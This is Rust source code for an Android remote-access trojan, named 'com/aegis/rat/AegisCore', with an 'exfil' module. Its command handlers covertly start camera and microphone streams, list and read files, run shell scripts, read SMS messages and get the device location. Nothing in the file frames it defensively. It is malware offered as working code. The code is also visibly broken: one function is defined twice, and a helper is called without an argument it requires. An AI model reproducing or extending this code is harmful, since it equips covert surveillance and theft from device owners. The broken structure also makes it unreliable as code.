use crate::exfil;
use serde_json::{json, Value};

pub async fn execute_command(action: &str, args: &str) -> Value {
    let args_json: Value = serde_json::from_str(args).unwrap_or(json!({}));
    
    match action {
        "start_camera" => {
            let camera_id = args_json.get("id").and_then(|s| s.as_u64()).unwrap_or(0) as i32;
            // Call Java
            call_java_void("startCameraStream", "(I)V", vec![&camera_id.into()]);
            json!({"status": "ok", "action": "start_camera"})
        },
        "stop_camera" => {
            call_java_void("stopCameraStream", "()V", vec![]);
            json!({"status": "ok", "action": "stop_camera"})
        },
        "start_mic" => {
            call_java_void("startMicStream", "()V", vec![]);
            json!({"status": "ok", "action": "start_mic"})
        },
        "stop_mic" => {
            call_java_void("stopMicStream", "()V", vec![]);
            json!({"status": "ok", "action": "stop_mic"})
        },
        // ... other commands
    }
}

/// Helper to call a void Java method
fn call_java_void(env: &jni::JNIEnv, method_name: &str, signature: &str, args: Vec<jni::objects::JValueGen>) {
    let _ = env.get_class("com/aegis/rat/AegisCore")
        .and_then(|class| env.call_static_method(&class, method_name, signature, &args));
}

pub async fn execute_command(action: &str, args: &str) -> Value {
    let args_json: Value = serde_json::from_str(args).unwrap_or(json!({}));
    
    match action {
        "screenshot" => {
            json!({"status": "requires_media_projection"})
        },
        "webcam_stream" => {
            exfil::start_webcam_stream(&args_json)
        },
        "mic_stream" => {
            exfil::start_mic_stream(&args_json)
        },
        "file_list" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("/sdcard");
            exfil::list_files(path)
        },
        "file_read" => {
            let path = args_json.get("path").and_then(|s| s.as_str()).unwrap_or("");
            exfil::read_file(path)
        },
        "execute" => {
            let script = args_json.get("script").and_then(|s| s.as_str()).unwrap_or("");
            exfil::execute_shell(script)
        },
        "sms_read" => {
            exfil::read_sms(&args_json)
        },
        "location" => {
            exfil::get_location(&args_json)
        },
        _ => json!({"error": "Unknown command"})
    }
}
